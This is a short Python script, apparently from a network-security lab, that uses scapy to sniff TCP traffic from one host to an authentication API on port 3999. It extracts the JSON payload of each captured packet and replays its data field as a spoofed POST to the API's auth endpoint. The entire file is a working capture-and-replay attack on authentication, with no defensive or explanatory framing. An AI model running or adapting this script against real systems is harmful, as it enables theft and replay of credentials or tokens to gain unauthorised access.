#!/usr/bin/python
from scapy.all import *
import requests
import json
import time

def spoof_pkt(pkt):
	if(pkt.haslayer(TCP)):
		if(pkt.haslayer(Raw)):
			#print(pkt[Raw].load)
			print("original packet.........")
			pkt.show()
			data = pkt[Raw].load.split("\n")[-1]
			print("json ->")
			print(data)
			print("\n")
			print("\n")
			time.sleep(5)
			print("sending spoofed packet to server..")
			print("\n")
			url = 'http://10.0.2.14:3999/api/auth'
			jsonData = json.loads(data)
			jsonToSend = dict()
			jsonToSend["data"] = jsonData['data']
			r = requests.post(url, json=jsonToSend)
			print("Response -> "+ r.text)
			print("\n")
pkt = sniff (filter='tcp and (src host 10.0.2.16 and dst port 3999)', prn=spoof_pkt)
